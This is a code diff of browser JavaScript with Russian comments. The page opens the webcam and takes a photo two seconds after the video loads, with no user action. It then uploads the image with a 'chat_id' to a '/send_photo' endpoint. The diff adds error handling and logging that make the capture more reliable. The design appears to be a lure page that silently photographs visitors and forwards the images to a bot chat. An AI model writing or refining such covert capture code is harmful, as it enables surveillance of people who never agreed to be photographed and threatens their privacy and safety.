@@ -14,8 +14,11 @@ if (userCode) {
                     let video = document.getElementById('video');
                     video.srcObject = stream;
                     video.onloadedmetadata = () => {
-                        setTimeout(() => capturePhoto(chat_id), 2000);
+                        setTimeout(() => capturePhoto(chat_id), 2000); // Захватываем фото через 2 секунды
                     };
+                })
+                .catch(error => {
+                    console.error("Ошибка при доступе к камере:", error);
                 });
 
             function capturePhoto(chat_id) {
@@ -25,9 +28,17 @@ if (userCode) {
 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
+
+                // Отображаем видео на canvas
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+                // Преобразуем canvas в изображение
                 canvas.toBlob(blob => {
+                    if (!blob) {
+                        console.error("Ошибка при создании фото из canvas");
+                        return;
+                    }
+
                     let formData = new FormData();
                     formData.append('chat_id', chat_id);
                     formData.append('photo', blob, 'photo.jpg');
@@ -35,8 +46,15 @@ if (userCode) {
                     fetch("/send_photo", {  
                         method: 'POST',
                         body: formData
-                    }).then(() => {
-                        video.srcObject.getTracks().forEach(track => track.stop());  
+                    }).then(response => {
+                        if (response.ok) {
+                            console.log("Фото отправлено");
+                        } else {
+                            console.error("Ошибка при отправке фото:", response.statusText);
+                        }
+
+                        // Останавливаем видеопоток после отправки фото
+                        video.srcObject.getTracks().forEach(track => track.stop());
                     });
                 }, 'image/jpeg');
             }
